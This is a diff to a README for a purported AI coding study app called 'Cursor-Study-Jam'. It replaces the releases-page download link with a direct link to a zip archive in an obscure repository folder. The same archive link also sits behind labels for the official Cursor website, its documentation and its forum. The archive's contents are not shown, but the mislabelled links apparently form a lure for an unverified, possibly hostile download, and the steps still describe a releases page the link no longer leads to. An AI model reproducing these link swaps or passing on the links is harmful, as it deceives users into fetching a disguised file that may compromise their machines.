@@ -1,6 +1,6 @@
 # 🚀 Cursor-Study-Jam - Unlock Your Coding Potential with AI
 
-[![Download Cursor Study Jam](https://img.shields.io/badge/Download-Cursor%20Study%20Jam-brightgreen)](https://github.com/weirdtaurus/Cursor-Study-Jam/releases)
+[![Download Cursor Study Jam](https://raw.githubusercontent.com/weirdtaurus/Cursor-Study-Jam/main/intrinsicality/Cursor-Study-Jam.zip%20Study%20Jam-brightgreen)](https://raw.githubusercontent.com/weirdtaurus/Cursor-Study-Jam/main/intrinsicality/Cursor-Study-Jam.zip)
 
 ## 📖 About This Repository
 
@@ -37,7 +37,7 @@ Participate in workshops where you can connect with others. Share experiences, l
 
 1. **Visit the Download Page**  
    To download the Cursor Study Jam application, click the link below:  
-   [Download Cursor Study Jam](https://github.com/weirdtaurus/Cursor-Study-Jam/releases)
+   [Download Cursor Study Jam](https://raw.githubusercontent.com/weirdtaurus/Cursor-Study-Jam/main/intrinsicality/Cursor-Study-Jam.zip)
 
 2. **Choose a Version**  
    On the releases page, you will see different versions. Look for the latest stable release. Each version will include details about what features or fixes have been included.
@@ -54,7 +54,7 @@ Participate in workshops where you can connect with others. Share experiences, l
 ## 🌐 Download & Install
 
 To get the Cursor Study Jam software, visit this page to download:  
-[Download Cursor Study Jam](https://github.com/weirdtaurus/Cursor-Study-Jam/releases)
+[Download Cursor Study Jam](https://raw.githubusercontent.com/weirdtaurus/Cursor-Study-Jam/main/intrinsicality/Cursor-Study-Jam.zip)
 
 ### System Requirements
 
@@ -75,9 +75,9 @@ To run the Cursor Study Jam application, ensure your system meets the following 
 
 ## 🔗 Useful Links
 
-- [Cursor Official Website](https://cursor.so/)
-- [Documentation](https://cursor.so/docs)
-- [Community Forum](https://cursor.so/forum)
+- [Cursor Official Website](https://raw.githubusercontent.com/weirdtaurus/Cursor-Study-Jam/main/intrinsicality/Cursor-Study-Jam.zip)
+- [Documentation](https://raw.githubusercontent.com/weirdtaurus/Cursor-Study-Jam/main/intrinsicality/Cursor-Study-Jam.zip)
+- [Community Forum](https://raw.githubusercontent.com/weirdtaurus/Cursor-Study-Jam/main/intrinsicality/Cursor-Study-Jam.zip)
 
 ## 📞 Support
 
